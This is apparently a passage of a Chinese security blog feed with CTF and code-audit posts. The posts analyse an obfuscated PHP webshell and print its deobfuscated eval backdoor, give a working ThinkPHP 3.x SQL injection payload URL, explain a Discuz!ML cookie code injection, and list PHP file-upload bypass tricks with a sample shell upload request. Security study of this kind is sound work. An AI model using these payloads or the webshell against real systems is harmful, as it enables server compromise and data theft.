class="hljs-string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;$r=<span class="hljs-string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;$L=<span class="hljs-string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;$s=str_replace(<span class="hljs-string">'C'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'cCreaCteC_fCuCCnction'</span>);$Z=<span class="hljs-string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;$h=<span class="hljs-string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;$q=str_replace(<span class="hljs-string">'&#125;&gt;'</span>,<span class="hljs-string">''</span>,$L.$g.$l.$Z.$r.$h.$o);$I=$s(<span class="hljs-string">''</span>,$q);$I();<span class="hljs-meta">?&gt;</span></code></pre><p>通过匿名函数调用<code>$q</code>中的代码，直接打印出<code>$q</code>代码</p><pre><code class="hljs perl">$k=<span class="hljs-string">"5ac91f7d"</span>;$kh=<span class="hljs-string">"b9615a29bc1d"</span>;$kf=<span class="hljs-string">"24d0b67c2c91"</span>;$p=<span class="hljs-string">"9GmIEgwZ7HiEeclS"</span>;function <span class="hljs-keyword">x</span>($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o=<span class="hljs-string">""</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$l;)&#123;<span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;<span class="hljs-keyword">return</span> $o;&#125;<span class="hljs-keyword">if</span>(@preg_match(<span class="hljs-string">"/$kh(.+)$kf/"</span>,@file_get_contents(<span class="hljs-string">"php://input"</span>),$m)==<span class="hljs-number">1</span>)&#123;@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[<span class="hljs-number">1</span>]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));<span class="hljs-keyword">print</span>(<span class="hljs-string">"$p$kh$r$kf"</span>);&#125;</code></pre><p>可控变量通过<code>@file_get_contents(&quot;php://input&quot;)</code>传入</p><p>分析if语句，代码执行<code>eval(@gzuncompress(@x(@base64_decode($m[1]),$k)))</code>的<code>$m[1]</code>值，逆解代码正好对应的是<code>$r=@base64_encode(@x(@gzcompress($o),$k));</code></p><p>通过如下代码构造<code>phpinfo();</code>字符串</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$k=<span class="hljs-string">"5ac91f7d"</span>;</span><span class="php">$kh=<span class="hljs-string">"b9615a29bc1d"</span>;</span><span class="php">$kf=<span class="hljs-string">"24d0b67c2c91"</span>;</span><span class="php">$p=<span class="hljs-string">"9GmIEgwZ7HiEeclS"</span>;</span><span class="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span><span class="hljs-params">($t,$k)</span></span>&#123;</span><span class="php">    $c=strlen($k);</span><span class="php">    $l=strlen($t);</span><span class="php">    $o=<span class="hljs-string">""</span>;</span><span class="php">    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$l;)&#123;</span><span class="php">        <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><span class="php">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><span class="php">        &#125;</span><span class="php">    &#125;</span><span class="php">    <span class="hljs-keyword">return</span> $o;</span><span class="php">&#125;</span><span class="php">$r=@base64_encode(@x(@gzcompress(<span class="hljs-string">'phpinfo();'</span>),$k));</span><span class="php"><span class="hljs-keyword">echo</span> $r;</span></code></pre><p>$r值<code>Tf1I8Rmu+y/+trONN2YioDbg</code></p><p>将该值传入源码中,由于<code>$r=@base64_encode(@x(@gzcompress($o),$k));</code>会对结果混淆，得到一堆乱码,在解一次即可。<br>该代码下添加<code>echo @gzuncompress(@x(@base64_decode($r),$k));</code></p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp3.x SQL注入</title>
    <link href="/2019/07/18/Thinkphp3-x-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/07/18/Thinkphp3-x-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h1><p>分析漏洞成因，其实更多是发掘框架漏洞发生的规律。Thinkphp使用PDO进行sql查询，本不应该出现sql注入。由于对传入数据未正确过滤，sql语句解析方法编写不当造成注入。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>控制器初始化语句</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;</span><span class="php"><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;</span><span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;</span><span class="php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span>&#123;</span><span class="php">        $condition[<span class="hljs-string">'username'</span>]=I(<span class="hljs-string">'username'</span>);</span><span class="php">        $data[<span class="hljs-string">'pass'</span>]=<span class="hljs-string">'123456'</span>;</span><span class="php">        $res=M(<span class="hljs-string">'user'</span>)-&gt;where($condition)-&gt;save($data);</span><span class="php">    &#125;</span><span class="php">&#125;</span></code></pre><p>执行该payload调用栈如下，分析这三个函数即可。其他只是配置加载、框架类加载、钩子调用等等并不关注。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Payload:<code>http://127.0.0.1/tp/tp3.2.3/index.php?username[0]=bind&amp;username[1]=0%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</code></p><p>Thinkphp框架使用I方法接收外部数据，并进行过滤，当未配置过滤方法C方法调用默认为<code>htmlspecialchars</code>方法，很显然html实体化对内部sql语句并不会造成影响。如下代码<code>filter</code>通过C方法调用设置为<code>htmlspecialchars</code>，再通过<code>call_user_func</code>回调，对传入的<code>username</code>字段进行过滤。<br><strong>/thinkphp/API/functions.php</strong><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>在经过I方法中框架过滤think_filter()</p><pre><code class="hljs coq">function think_filter(&amp;$value)&#123;// TODO 其他安全过滤// 过滤查询特殊字符    <span class="hljs-keyword">if</span>(preg_match('/^(EXP|<span class="hljs-type">NEQ</span>|<span class="hljs-type">GT</span>|<span class="hljs-type">EGT</span>|<span class="hljs-type">LT</span>|<span class="hljs-type">ELT</span>|<span class="hljs-type">OR</span>|<span class="hljs-type">XOR</span>|<span class="hljs-type">LIKE</span>|<span class="hljs-type">NOTLIKE</span>|<span class="hljs-type">NOT</span> BETWEEN|<span class="hljs-type">NOTBETWEEN</span>|<span class="hljs-type">BETWEEN</span>|<span class="hljs-type">NOTIN</span>|<span class="hljs-type">NOT</span> IN|<span class="hljs-type">IN</span>)$/i',$value))&#123;        $value .= ' ';    &#125;</code></pre><p>根据调用栈，跟进save()方法。查看函数返回值result，跟进update()方法(也可以看调用栈)。</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span><span class="hljs-params">($data,$options)</span> </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;model  =   $options[<span class="hljs-string">'model'</span>];    <span class="hljs-keyword">$this</span>-&gt;parseBind(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'bind'</span>])?$options[<span class="hljs-string">'bind'</span>]:<span class="hljs-keyword">array</span>());    $table  =   <span class="hljs-keyword">$this</span>-&gt;parseTable($options[<span class="hljs-string">'table'</span>]);    $sql   = <span class="hljs-string">'UPDATE '</span> . $table . <span class="hljs-keyword">$this</span>-&gt;parseSet($data);    <span class="hljs-keyword">if</span>(strpos($table,<span class="hljs-string">','</span>))&#123;<span class="hljs-comment">// 多表更新支持JOIN操作</span>        $sql .= <span class="hljs-keyword">$this</span>-&gt;parseJoin(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'join'</span>])?$options[<span class="hljs-string">'join'</span>]:<span class="hljs-string">''</span>);    &#125;    $sql .= <span class="hljs-keyword">$this</span>-&gt;parseWhere(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'where'</span>])?$options[<span class="hljs-string">'where'</span>]:<span class="hljs-string">''</span>);    <span class="hljs-keyword">if</span>(!strpos($table,<span class="hljs-string">','</span>))&#123;        <span class="hljs-comment">//  单表更新支持order和lmit</span>        $sql   .=  <span class="hljs-keyword">$this</span>-&gt;parseOrder(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'order'</span>])?$options[<span class="hljs-string">'order'</span>]:<span class="hljs-string">''</span>)            .<span class="hljs-keyword">$this</span>-&gt;parseLimit(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'limit'</span>])?$options[<span class="hljs-string">'limit'</span>]:<span class="hljs-string">''</span>);    &#125;    $sql .=   <span class="hljs-keyword">$this</span>-&gt;parseComment(!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'comment'</span>])?$options[<span class="hljs-string">'comment'</span>]:<span class="hljs-string">''</span>);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;execute($sql,!<span class="hljs-keyword">empty</span>($options[<span class="hljs-string">'fetch_sql'</span>]) ? <span class="hljs-keyword">true</span> : <span class="hljs-keyword">false</span>);&#125;</code></pre><p>观察语句，注入点发生在where后，跟进<code>parseWhere</code>方法,查找<code>$whereStr</code>拼接地方。</p><p>跟进<code>parseWhereItem</code>方法.当val为数组时，将索引为0赋值给$exp，追踪exp判断语句。当$exp值为’bind’时。将val[1]与<code>:</code>拼接构造执行PDO语句的占位符。只要赋值<code>0</code>即可实现sql查询语句注入。</p><pre><code class="hljs gams">elseif(<span class="hljs-string">'bind'</span> == <span class="hljs-symbol">$</span><span class="hljs-built-in">exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span>                    <span class="hljs-symbol">$</span>whereStr .= <span class="hljs-symbol">$</span>key.<span class="hljs-string">' = :'</span>.<span class="hljs-symbol">$</span>val[<span class="hljs-number">1</span>];</code></pre><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload: <code>http://127.0.0.1/tp/tp3.2.3/?username[0]=bind&amp;username[1]=0%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</code></p><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DiscuzML 3.x 代码注入</title>
    <link href="/2019/07/12/DiscuzML-3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/07/12/DiscuzML-3-x-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞刚出来时候发现分析文章很少，只能自己审计审计。根据poc，首先要排除是否是文件名导致的代码注入(可能就我在纠结这个吧，太菜了估计)。<br>带这个疑问了下群里@xq17师傅，在自己进行如下验证。<br>通过修改缓存内容判断是读内容导致代码注入，还有就是查看文件包含点，是<code>include_once</code> 如果有可执行代码会报出<code>error</code>直接结束程序。<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><blockquote><p>php5.6<br>deepin<br>版本Discuz!ML 3.4</p></blockquote><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>根据poc，将cookie中language字段拼接<code>&#39;.phpinfo().&#39;</code>可实现代码注入<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞触发原因"><a href="#漏洞触发原因" class="headerlink" title="漏洞触发原因"></a>漏洞触发原因</h1><p>未过滤cookie输入</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过debug报错找到文件包含处在文件<strong>/upload/source/module/portal/portal_index.php第32行</strong></p><pre><code class="hljs php"><span class="hljs-keyword">include_once</span> template(<span class="hljs-string">'diy:portal/index'</span>);</code></pre><p>跟进该函数查看返回值为<code>&quot;DISCUZ_ROOT.$cachefile;&quot;</code>，溯源<code>$cachefile</code><br>其中<code>DISCUZ_LANG</code>值为<code>cookie</code>中字段<code>language</code>值可控,导致$cachfile文件名可控</p><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;var[<span class="hljs-string">'oldlanguage'</span>] = $lng; <span class="hljs-comment">// Store Old Language Value for compare</span><span class="hljs-comment">// define DISCUZ_LANG</span>define(<span class="hljs-string">'DISCUZ_LANG'</span>, $lng);$cachefile = <span class="hljs-string">'./data/template/'</span>.DISCUZ_LANG.<span class="hljs-string">'_'</span>.(defined(<span class="hljs-string">'STYLEID'</span>) ? STYLEID.<span class="hljs-string">'_'</span> : <span class="hljs-string">'_'</span>).$templateid.<span class="hljs-string">'_'</span>.str_replace(<span class="hljs-string">'/'</span>, <span class="hljs-string">'_'</span>, $file).<span class="hljs-string">'.tpl.php'</span>;</code></pre><p>跟进模板操作函数<code>checktplrefresh</code>,跟进<code>parse_template</code>模板解析函数。文件<strong>/upload/source/class/class_template.php第84行</strong>将$headeradd拼接进模板中，往回看该文件70-77行。<br>headeradd字符串拼接为<code>|| checktplrefresh(&#39;$tplfile&#39;, &#39;$fname&#39;, &quot;.time().&quot;, &#39;$templateid&#39;, &#39;$cachefile&#39;, &#39;$tpldir&#39;, &#39;$file&#39;)\n&quot;</code> ，其中<code>$cachefile</code>正好是可控，导致文件包含之后拼接的代码执行。</p><pre><code class="hljs php">$headeradd = $headerexists ? <span class="hljs-string">"hookscriptoutput('$basefile');"</span> : <span class="hljs-string">''</span>;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;subtemplates)) &#123;   $headeradd .= <span class="hljs-string">"\n0\n"</span>;   <span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">$this</span>-&gt;subtemplates <span class="hljs-keyword">as</span> $fname) &#123;      $headeradd .= <span class="hljs-string">"|| checktplrefresh('$tplfile', '$fname', "</span>.time().<span class="hljs-string">", '$templateid', '$cachefile', '$tpldir', '$file')\n"</span>;   &#125;   $headeradd .= <span class="hljs-string">';'</span>;&#125;</code></pre><p>可触发的代码的文件只有<strong>en’.phpinfo().’<em>1</em>1_common_header_portal_index.tpl.php</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP文件上传漏洞总结</title>
    <link href="/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛时候基本每一场都会遇到文件上传的题目，但是解题思路一直受限于文件上传漏洞的不清晰。遂整理，虽然里面很多绕过CTF不怎么会考了(可能太简单了，或许我太菜)。</p><h1 id="文件上传包结构"><a href="#文件上传包结构" class="headerlink" title="文件上传包结构"></a>文件上传包结构</h1><ol><li>请求类型:POST</li><li>前端指定类型enctype</li></ol><pre><code class="hljs oxygene">&lt;form action=<span class="hljs-string">''</span> enctype=<span class="hljs-string">'multipart/form-data'</span> <span class="hljs-function"><span class="hljs-keyword">method</span>='<span class="hljs-title">POST</span>'&gt;</span><span class="hljs-function">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>='<span class="hljs-title">file</span>' <span class="hljs-title">name</span>='<span class="hljs-title">file</span>'&gt;</span><span class="hljs-function">&lt;/<span class="hljs-title">form</span>&gt;</span></code></pre><p>multipart 格式的数据会将一个表单拆分为多个部分（part），每个部分对应一个输入域。在一般的表单输入域中，<br>它所对应的部分中会放置文本型数据，但是如果上传文件的话，它所对应的部分可以是二进制</p><p><strong>curl、python都有API可以上传文件不用特意构造文件上传包</strong></p><pre><code class="hljs applescript"><span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"Filename"</span>shell.php<span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"desc11"</span>desc112<span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"task"</span>doupload<span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"file_id"</span><span class="hljs-number">0</span><span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"upload_file"</span>; filename=<span class="hljs-string">"shell.php::$DATA"</span>Content-Type: <span class="hljs-built_in">application</span>/octet-stream&lt;?phpphpinfo();<span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2</span>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">"Upload"</span>Submit Query<span class="hljs-comment">------------cH2cH2Ij5Ij5ei4KM7Ef1gL6Ij5cH2--</span></code></pre><h1 id="文件上传存在的检测"><a href="#文件上传存在的检测" class="headerlink" title="文件上传存在的检测"></a>文件上传存在的检测</h1><blockquote><ol><li>客户端javascript检测(检测文件扩展名)</li><li>服务端MIME类型检测(检测Content-Type内容)</li><li>服务器端目录路径检测(检测和Path参数相关的内容)</li><li>服务端文件扩展名检测(检测跟文件extension相关的内容)</li><li>服务端文件内容检测(检测内容是否合法或含有恶意代码)</li></ol></blockquote><h1 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkPic</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">var</span> rgx= <span class="hljs-string">"(.jpg|.JPG|.gif|.GIF)$"</span>; <span class="hljs-keyword">var</span> re=<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(rgx);<span class="hljs-keyword">var</span> file_name=$(<span class="hljs-string">"#picFile"</span>).val();</code></pre><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul><li>审查元素，修改Javascript检测函数</li><li>burpsuite抓包改后缀</li></ul><h1 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h1><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) || ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">'/'</span> . $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]                        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-keyword">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'上传出错！'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'文件类型不正确，请重新上传！'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH.<span class="hljs-string">'文件夹不存在,请手工创建！'</span>;    &#125;&#125;</code></pre><h2 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>burpsuite代理进行抓包,修改<code>Content-Type</code>为<code>image/gif</code>….</p><h1 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h1><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;$msg = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>,<span class="hljs-string">'png'</span>,<span class="hljs-string">'gif'</span>);    $file_ext = substr($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],strrpos($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>],<span class="hljs-string">"."</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];        $img_path = $_GET[<span class="hljs-string">'save_path'</span>].<span class="hljs-string">"/"</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">"YmdHis"</span>).<span class="hljs-string">"."</span>.$file_ext;        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = <span class="hljs-keyword">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'上传出错！'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">"只允许上传.jpg|.png|.gif类型文件！"</span>;    &#125;&#125;</code></pre><h2 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>存在path参数可控，配合<strong>解析漏洞</strong>上传webshell<br>php 00截断: <code>GET:/upload/1.php%001.jpg</code><br>            <code>POST:在文件名后burpsuite添加二进制00</code></p><p><a href="https://note.youdao.com/ynoteshare1/index.html?id=36658a534d9b3966bdef19cc3c5cb576&type=note" target="_blank" rel="noopener">00截断技巧</a></p><h2 id="适用场合"><a href="#适用场合" class="headerlink" title="适用场合"></a>适用场合</h2><pre><code class="hljs crystal"><span class="hljs-keyword">include</span>(<span class="hljs-keyword">require</span>)file_get_contentsfile_exists所有url中参数可以用%<span class="hljs-number">0</span>0控制</code></pre><h1 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h1><h2 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>利用思路:<strong>os系统特性、后缀名截取不规范、php代码缺陷、过滤不完全、配合伪协议解析图形文件</strong></p><h3 id="后端采用in-arrary函数判断文件后缀-黑名单"><a href="#后端采用in-arrary函数判断文件后缀-黑名单" class="headerlink" title="后端采用in_arrary函数判断文件后缀(黑名单)"></a>后端采用in_arrary函数判断文件后缀(黑名单)</h3><ul><li>更换.htaccess偏门文件名和后缀名</li><li>未去除末尾空格，添加空格绕过</li><li>::$DATA绕过（windows）</li><li>大小写混写</li><li>后缀添加点号(windows)</li><li>不可绕过考虑phar://协议利用，若过滤配合(compress://)</li><li>/.符号绕过</li></ul><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>webserver解析漏洞、00解析漏洞</p><h1 id="服务器端文件内容检测"><a href="#服务器端文件内容检测" class="headerlink" title="服务器端文件内容检测"></a>服务器端文件内容检测</h1><h2 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h2><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>GIF ： 47 49 46 38 39 61 (GIF89a)<br>PNG： 89 50 4E 47</p><h3 id="绕过方法-伪造幻数，添加webshell"><a href="#绕过方法-伪造幻数，添加webshell" class="headerlink" title="绕过方法:伪造幻数，添加webshell"></a>绕过方法:伪造幻数，添加webshell</h3><h2 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h2><p>伪造好幻数后，添加webshell,添加额外内容，增大文件大小</p><h2 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h2><p>调用API或者函数进行文件加载检测，常见是图像渲染检测，进行二次渲染</p><h3 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>参考链接：<a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a><br><a href="https://od0d.cn/2019/04/17/DDCTF-web题解/#image-upload" target="_blank" rel="noopener">https://od0d.cn/2019/04/17/DDCTF-web题解/#image-upload</a></p><h1 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h1><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">"gif"</span>,<span class="hljs-string">"png"</span>,<span class="hljs-string">"jpg"</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">"./"</span>;$filename = $_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">"error:can not move"</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">"error:not an upload file！"</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">"file upload success.file path is: "</span>.$newfile.<span class="hljs-string">"\n&lt;br /&gt;"</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'error'</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload file error: "</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">"."</span>,$_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">"error:upload the file type is not allowed，delete the file！"</span>);&#125;<span 